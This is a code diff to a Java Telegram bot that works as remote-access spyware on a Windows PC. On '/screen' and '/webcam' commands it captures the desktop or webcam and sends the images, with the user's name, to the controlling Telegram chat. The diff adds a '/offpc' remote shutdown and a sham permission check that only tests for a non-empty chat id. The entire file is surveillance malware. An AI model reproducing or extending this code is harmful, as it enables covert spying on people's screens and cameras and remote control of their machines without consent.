@@ -6,9 +6,11 @@ import org.telegram.telegrambots.meta.api.objects.Update;
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.Map;
 
 public class Hello extends TelegramLongPollingBot {
+
 
     @Override
     public String getBotUsername() {
@@ -42,41 +44,68 @@ public class Hello extends TelegramLongPollingBot {
                 SendMessage response = new SendMessage();
                 response.setChatId(update.getMessage().getChatId().toString());
                 SendPhoto photo = new SendPhoto();
+
                 InputFile file;
                 Map<String, String> map = System.getenv();
+
+
                 switch (command) {
+
                     case "/screen":
-                        photo.setChatId(update.getMessage().getChatId().toString());
-                        Starter.callScreen();
-                        Thread.sleep(2000);
-                        file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Screenshot\\\\boba.jpg"));
-                        System.out.println("Хочу достать из: " + file.getAttachName());
-                        photo.setPhoto(file);
-                        response.setChatId(update.getMessage().getChatId().toString());
-                        response.setText("Screen dekstop from PC: " + map.get("USERNAME"));
-                        execute(response);
-                        execute(photo);
+                        if (!response.getChatId().equals("")) {
+                            photo.setChatId(update.getMessage().getChatId().toString());
+                            Starter.callScreen();
+                            Thread.sleep(2000);
+                            file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Screenshot\\\\boba.jpg"));
+                            System.out.println("Хочу достать из: " + file.getAttachName());
+                            photo.setPhoto(file);
+                            response.setChatId(update.getMessage().getChatId().toString());
+                            response.setText("Screen dekstop from PC: " + map.get("USERNAME"));
+                            execute(response);
+                            execute(photo);
+                        }
+                        else {
+                            response.setText("You not have permission by this bot");
+                            execute(response);
+                        }
                         break;
                     case "/webcam":
-                        photo.setChatId(update.getMessage().getChatId().toString());
-                        Starter.callCam();
-                        Thread.sleep(2000);
-                        file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Cam\\\\boba.png"));
-                        photo.setPhoto(file);
-                        response.setChatId(update.getMessage().getChatId().toString());
-                        response.setText("Webcam dekstop from PC: " + map.get("USERNAME"));
-                        execute(response);
-                        execute(photo);
+                        if (!response.getChatId().equals("")) {
+                            photo.setChatId(update.getMessage().getChatId().toString());
+                            Starter.callCam();
+                            Thread.sleep(2000);
+                            file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Cam\\\\boba.png"));
+                            photo.setPhoto(file);
+                            response.setChatId(update.getMessage().getChatId().toString());
+                            response.setText("Webcam dekstop from PC: " + map.get("USERNAME"));
+                            execute(response);
+                            execute(photo);
+                        }
+                        else {
+                            response.setText("You not have permission by this bot");
+                            execute(response);
+                        }
+                        break;
+                    case "/offpc":
+                        if (!response.getChatId().equals("")) {
+                            offPc();
+                        }else{
+                            response.setText("You not have permission by this bot");
+                        execute(response);}
                         break;
                     default:
                         response.setText("Bad command");
                         execute(response);
-                }
-            } catch (Exception e) {
+                }}
+               catch(Exception e){
 
+                }
             }
         }
+
+
+    public void offPc() throws IOException {
+        String[] cm = {"shutdown", "-h"};
+        Runtime.getRuntime().exec(cm);
     }
-
-
 }
